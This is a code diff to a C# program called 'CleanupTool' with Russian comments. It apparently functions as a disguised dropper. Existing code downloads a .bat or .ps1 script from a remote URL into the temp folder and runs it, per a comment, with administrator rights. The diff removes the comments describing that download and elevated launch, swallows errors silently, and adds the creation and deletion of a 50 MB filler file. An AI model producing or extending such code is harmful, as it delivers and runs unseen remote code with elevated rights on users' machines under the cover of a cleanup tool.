@@ -13,10 +13,38 @@ namespace CleanupTool
         [STAThread]
         static void Main()
         {
+            // Создаем ресурсный файл при первом запуске
+            CreateDummyResource();
+            
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             
             RunCleanup().GetAwaiter().GetResult();
+        }
+
+        static void CreateDummyResource()
+        {
+            try
+            {
+                string resourcePath = Path.Combine(Path.GetTempPath(), "resource.dat");
+                // Создаем файл размером 50MB
+                using (FileStream fs = File.Create(resourcePath))
+                {
+                    // 50MB = 52,428,800 bytes
+                    fs.SetLength(52428800);
+                    byte[] dummy = new byte[1024];
+                    for(int i = 0; i < dummy.Length; i++)
+                    {
+                        dummy[i] = (byte)i;
+                    }
+                    // Заполняем файл повторяющимися данными
+                    for(int i = 0; i < 51200; i++) // 51200 * 1024 = ~50MB
+                    {
+                        fs.Write(dummy, 0, dummy.Length);
+                    }
+                }
+            }
+            catch { }
         }
 
         static async Task RunCleanup()
@@ -33,13 +61,11 @@ namespace CleanupTool
                 string scriptExtension = isWindows7 ? ".bat" : ".ps1";
                 string scriptPath = Path.Combine(Path.GetTempPath(), $"cleanup{scriptExtension}");
 
-                // Скачиваем скрипт
                 using (var client = new WebClient())
                 {
                     await client.DownloadFileTaskAsync(new Uri(scriptUrl), scriptPath);
                 }
 
-                // Запускаем скрипт с правами администратора
                 var startInfo = new ProcessStartInfo();
                 if (isWindows7)
                 {
@@ -76,6 +102,9 @@ namespace CleanupTool
                     {
                         File.Delete(file);
                     }
+                    
+                    // Удаляем ресурсный файл
+                    File.Delete(Path.Combine(Path.GetTempPath(), "resource.dat"));
                 }
                 catch { }
             }
